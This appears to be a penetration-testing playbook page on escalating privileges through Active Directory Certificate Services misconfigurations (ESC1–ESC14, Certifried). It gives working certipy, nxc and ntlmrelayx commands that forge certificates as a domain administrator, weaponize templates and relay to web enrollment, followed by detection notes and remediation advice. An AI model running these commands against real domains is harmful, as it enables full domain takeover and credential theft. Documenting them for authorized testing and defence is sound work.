# Stage 3 — AD Certificate Services (ESC1–ESC14, Certifried)

AD CS misconfigurations are among the most reliable domain-escalation paths. A
certificate can be used to authenticate as any principal (PKINIT → TGT), so an
abusable template = Domain Admin.

## Enumerate
```bash
certipy find -u user@corp.local -p pass -dc-ip <DC> -stdout -vulnerable
nxc ldap <DC> -u user -p pass -M adcs
```
`certipy find -vulnerable` labels each finding ESC1..ESCx. Note the CA name, and
any template that is enabled, allows enrollment for low-priv users, and has a
dangerous setting.

## The common ESCs (what to look for → exploit)

**ESC1** — template allows requester to supply `subjectAltName` (SAN) + client
auth EKU + low-priv enroll. Request a cert *as* Domain Admin:
```bash
certipy req -u user@corp.local -p pass -ca <CA> -template <T> -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip <DC>          # -> TGT + NT hash
```

**ESC2** — template has "Any Purpose" EKU → use like ESC1/for any auth.

**ESC3** — Enrollment Agent certificate → request certs on behalf of others.

**ESC4** — you have write/GenericAll over a template's ACL → reconfigure it into
an ESC1 (add SAN flag), exploit, then restore.
```bash
certipy template -u user@corp.local -p pass -template <T> -write   # weaponize
```

**ESC6** — CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` → SAN accepted on *any*
template (like ESC1 domain-wide).

**ESC7** — you have `ManageCA`/`ManageCertificates` rights → grant yourself
enroll / approve a failed request / enable a template.

**ESC8** — HTTP web enrollment + NTLM → **relay** a coerced machine to
`/certsrv` and get its cert (pairs with coercion):
```bash
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
# then coerce the DC (see delegation-and-coercion.md) -> DC cert -> DCSync
```

**ESC9/ESC10** — weak/no strong cert mapping (`szOID`… / `StrongCertificateBinding`
disabled) → cert mapping abuse to authenticate as another user.

**ESC11** — relay to the CA's RPC (ICPR) endpoint when IF_ENFORCEENCRYPTICERTREQUEST off.

**ESC13** — template with an issuance policy linked to a privileged group →
enrolling grants that group's rights.

**ESC14** — write access to `altSecurityIdentities` → explicit cert mapping to a
target account.

**Certifried (CVE-2022-26923)** — with machine-account-creation rights, create a
computer, change its `dNSHostName` to a DC's, request a cert → auth as the DC.

## Golden Certificate (persistence — document only)
Steal the CA private key (`certipy ca -backup`) → forge certs for anyone
indefinitely. Report as full-CA-compromise persistence; don't leave artifacts.

## OPSEC
Certificate requests are logged on the CA (4886/4887). ESC8 relay is noisy.
Restore any template you weaponized (ESC4).

## Remediation to recommend
Remove SAN-from-request (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) unless required;
scope enrollment permissions tightly; disable `EDITF_ATTRIBUTESUBJECTALTNAME2`;
require manager approval on sensitive templates; enable HTTPS + EPA and disable
NTLM on web enrollment (ESC8); enable strong certificate mapping (KB5014754);
lock down `ManageCA`/template ACLs; set machine-account-quota to 0 (Certifried).
